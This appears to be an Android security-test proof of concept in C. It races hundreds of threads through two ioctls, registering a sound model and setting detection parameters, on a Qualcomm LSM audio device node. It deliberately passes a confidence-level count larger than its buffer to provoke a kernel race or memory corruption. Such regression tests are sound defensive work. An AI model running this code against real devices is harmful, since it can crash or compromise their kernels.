/*
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

#define THREAD_NUM	600
#define DEV "/dev/snd/pcmC0D16c"

typedef _Bool bool;

enum lsm_app_id {
    LSM_VOICE_WAKEUP_APP_ID = 1,
    LSM_VOICE_WAKEUP_APP_ID_V2 = 2,
};

enum lsm_detection_mode {
    LSM_MODE_KEYWORD_ONLY_DETECTION = 1,
    LSM_MODE_USER_KEYWORD_DETECTION
};

enum lsm_vw_status {
    LSM_VOICE_WAKEUP_STATUS_RUNNING = 1,
    LSM_VOICE_WAKEUP_STATUS_DETECTED,
    LSM_VOICE_WAKEUP_STATUS_END_SPEECH,
    LSM_VOICE_WAKEUP_STATUS_REJECTED
};

enum LSM_PARAM_TYPE {
    LSM_ENDPOINT_DETECT_THRESHOLD = 0,
    LSM_OPERATION_MODE,
    LSM_GAIN,
    LSM_MIN_CONFIDENCE_LEVELS,
    LSM_REG_SND_MODEL,
    LSM_DEREG_SND_MODEL,
    LSM_CUSTOM_PARAMS,
    LSM_PARAMS_MAX,
};

struct snd_lsm_ep_det_thres {
    __u32 epd_begin;
    __u32 epd_end;
};

struct snd_lsm_detect_mode {
    enum lsm_detection_mode mode;
    bool detect_failure;
};

struct snd_lsm_gain {
    __u16 gain;
};

struct snd_lsm_sound_model_v2 {
    __u8 __user *data;
    __u8 *confidence_level;
    __u32 data_size;
    enum lsm_detection_mode detection_mode;
    __u8 num_confidence_levels;
    bool detect_failure;
};

struct snd_lsm_session_data {
    enum lsm_app_id app_id;
};

struct snd_lsm_event_status {
    __u16 status;
    __u16 payload_size;
    __u8 payload[0];
};

struct snd_lsm_detection_params {
    __u8 *conf_level;
    enum lsm_detection_mode detect_mode;
    __u8 num_confidence_levels;
    bool detect_failure;
};

struct lsm_params_info {
    __u32 module_id;
    __u32 param_id;
    __u32 param_size;
    __u8 __user *param_data;
    enum LSM_PARAM_TYPE param_type;
};

struct snd_lsm_module_params {
    __u8 __user *params;
    __u32 num_params;
    __u32 data_size;
};

struct snd_lsm_output_format_cfg {
    __u8 format;
    __u8 packing;
    __u8 events;
    __u8 mode;
};

#define SNDRV_LSM_DEREG_SND_MODEL _IOW('U', 0x01, int)
#define SNDRV_LSM_EVENT_STATUS  _IOW('U', 0x02, struct snd_lsm_event_status)
#define SNDRV_LSM_ABORT_EVENT   _IOW('U', 0x03, int)
#define SNDRV_LSM_START     _IOW('U', 0x04, int)
#define SNDRV_LSM_STOP      _IOW('U', 0x05, int)
#define SNDRV_LSM_SET_SESSION_DATA _IOW('U', 0x06, struct snd_lsm_session_data)
#define SNDRV_LSM_REG_SND_MODEL_V2 _IOW('U', 0x07,\
                    struct snd_lsm_sound_model_v2)
#define SNDRV_LSM_LAB_CONTROL   _IOW('U', 0x08, uint32_t)
#define SNDRV_LSM_STOP_LAB  _IO('U', 0x09)
#define SNDRV_LSM_SET_PARAMS    _IOW('U', 0x0A, \
                    struct snd_lsm_detection_params)
#define SNDRV_LSM_SET_MODULE_PARAMS _IOW('U', 0x0B, \
                    struct snd_lsm_module_params)

int fd;
pthread_t thread_id[THREAD_NUM+1] = { 0 };
int thread_ret[THREAD_NUM] = { 0 };
int attack = 0;

struct snd_lsm_sound_model_v2 snd_model_v2_1 = {0, 0, 0, 0, 0, 0};
struct snd_lsm_sound_model_v2 snd_model_v2_2 = {0, 0, 0, 0, 0, 0};
struct snd_lsm_detection_params snd_params = {0, 0, 0, 0};
unsigned char snd_data[1024] = "abcdefghigklmnjfsljffsljflwjwfhnsdnfsnfsnfsnflnflsfls";
unsigned char confidence_level_1[4] = "123";
unsigned char confidence_level_2[20] = "12345678";

static int set_affinity(int num)
{
    int ret = 0;
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(num, &mask);
    ret = sched_setaffinity(0, sizeof(cpu_set_t), &mask);

    return ret;
}

void* child_ioctl_0()
{
    set_affinity(1);
    snd_model_v2_1.data = snd_data;
    snd_model_v2_1.data_size = sizeof(snd_data);
    snd_model_v2_1.confidence_level = confidence_level_1;
    snd_model_v2_1.num_confidence_levels = strlen((const char *)confidence_level_1);
    snd_model_v2_1.detection_mode = LSM_MODE_USER_KEYWORD_DETECTION;
    snd_model_v2_1.detect_failure = 1;

    while(1){
	ioctl(fd, SNDRV_LSM_REG_SND_MODEL_V2, &snd_model_v2_1);
    }
}

void* child_ioctl_1()
{
    set_affinity(2);
    snd_model_v2_2.data = snd_data;
    snd_model_v2_2.data_size = sizeof(snd_data);
    snd_model_v2_2.confidence_level = confidence_level_2;
    snd_model_v2_2.num_confidence_levels = strlen((const char *)confidence_level_2);
    snd_model_v2_2.detection_mode = LSM_MODE_USER_KEYWORD_DETECTION;
    snd_model_v2_2.detect_failure = 1;

    snd_params.num_confidence_levels = 20;
    snd_params.conf_level = confidence_level_2;
    snd_params.detect_failure = 1;
    snd_params.detect_mode = LSM_MODE_USER_KEYWORD_DETECTION;

    while(1){
	nanosleep((const struct timespec[]){{0, 100000}}, NULL);
	ioctl(fd, SNDRV_LSM_SET_PARAMS, &snd_params);
    }
}

int main()
{
    int i, ret;

    set_affinity(0);

    fd = open(DEV,O_RDWR);
    if(fd == -1){
	return -1;
    }

    ret = ioctl(fd, SNDRV_LSM_START, 0);
    if(ret)
	return -1;

    for(i = 0; i < 300; i = i + 2){
	thread_ret[i] = pthread_create(thread_id + i, NULL, child_ioctl_0, NULL);
	thread_ret[i+1] = pthread_create(thread_id + i +1, NULL, child_ioctl_1, NULL);
    }

    i = 0;
    attack = 1;
    while(100){
	nanosleep((const struct timespec[]){{0, 100000}}, NULL);
    }
    attack = 0;
    return 0;
}
